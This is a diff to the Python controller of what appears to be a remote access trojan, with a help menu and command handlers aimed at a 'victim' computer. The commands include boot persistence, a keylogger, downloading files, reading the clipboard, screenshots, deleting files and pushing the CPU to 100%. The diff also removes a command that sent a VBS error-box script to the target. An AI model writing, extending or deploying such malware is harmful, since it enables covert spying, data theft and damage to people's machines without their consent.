@@ -24,7 +24,7 @@ session_ids = []
 COMMANDS = ["help", "sessions"]
 SESSION_COMMANDS = ["help", "back", "tree", "install", "matrix", "disconnect", "ps", "kill", "keylogger", "getlogs",
                     "keybind", "msg", "statlights", "delete", "uninstall", "ls", "whoami", "clipboard", "download",
-                    "error", "screenshot", "cpu", "kermit", "url"]
+                    "screenshot", "cpu", "kermit", "url"]
 
 
 class Commands:
@@ -33,17 +33,36 @@ class Commands:
         self.helpmsg = """
         All sessions scripts with a "(p)" at the end need the shell to be installed the ones with the "(t)" can be used without installation
         menu Commands:
-        help: shows this message
-        back: gets deselects the session and gets you back to them main menu
-        sessions: [-s {sesion id} session id to sellect a session] [-d {sesion id} to dellete a session]
+            help: shows this message
+            back: gets deselects the session and gets you back to them main menu
+            sessions: [-s {sesion id} session id to sellect a session] [-d {sesion id} to dellete a session]
         
         session Commands|:
         disconnect: Disconnects from the selected shell
         misc:
-            tree: Shows the entire dirrectorystructure of the 'C:\\' drive
-            install: Makes the shell persistent(starts with the victims computer)
+            tree: Shows the entire dirrectorystructure of the 'C:\\' drive (t)
+            install: Makes the shell persistent(starts with the victims computer) (t)
+            uninstall: Undos the install command (p)
+            disconnect: disconnect and termiate the shel(reconnects when victim reboots if the shell is installed)
         troll:
-            matrix: [{number} how many times a cmd window will open] opens a big cmd window with random numbers generating(t)
+            matrix: [number of how many times a cmd window will open] opens a big cmd window with random numbers generating(t)
+            kill: [pid] kills a running task with given pid (t)
+            keybind: [first key] + [seccond key] + [and so on] sends a given keybind(check readme for all special keys) (t)
+            msg: [your message] opens notepad and writes the given message (t)
+            statlights: [number of blinks] makes the Caps-, Num- and Scrolllock lights blink (t)
+            delete: [absolute path to file] deletes the given file (t)
+            cpu: [secconds for how long the cpu will got to 100%] makes the cpu got to 100%(this can break the computer if the cpu runs too hot) (t)
+            kermit: just dont ask (t)
+            url: [url] open the given url in the default browser (t)
+        Spionage:
+            Keylogger: Installs a keylogger, retreive the logs with getlogs (p)
+            ps: shows all running processes (t)
+            ls: [absolute path] like linux ls command (t)
+            whoami: shows the pc and username (t)
+            clipboard: shows the clipboard content (t)
+            download: [absolute path] downloads the given file (t)
+            screenshot: takes a screenshot (t)
+            
         """
 
     # commands in the main menu
@@ -333,26 +352,6 @@ class Commands:
                 print("You need to specify a path")
             else:
                 print("Too many argument type 'help' for more")
-        # open many error messages
-        elif message == "error":
-            if args:
-                # checks if argument is a number
-                try:
-                    t = int(args[0])
-                except ValueError:
-                    print("you need to input a number type 'help' for more")
-                username = sendMessage("c o echo %USERNAME%").strip()
-                with open("extraScripts/errorbox.vbs", "r") as file:
-                    sendMessage(file.read())
-                name = receiveMessage()
-                halve = int(args[0]) / 2
-                for i in range(int(args[0])):
-                    sendMessage(f'c n C:\\Users\\{username}\\AppData\\Local\\Temp\\{name}')
-
-            elif not args:
-                print("you need to specify the quantity of windows type 'help' for more")
-            else:
-                print("too many arguments type 'help' for more")
         # takes a screenshot
         elif message == "screenshot":
             usersName = str(sendMessage("c o echo %USERNAME%").strip())
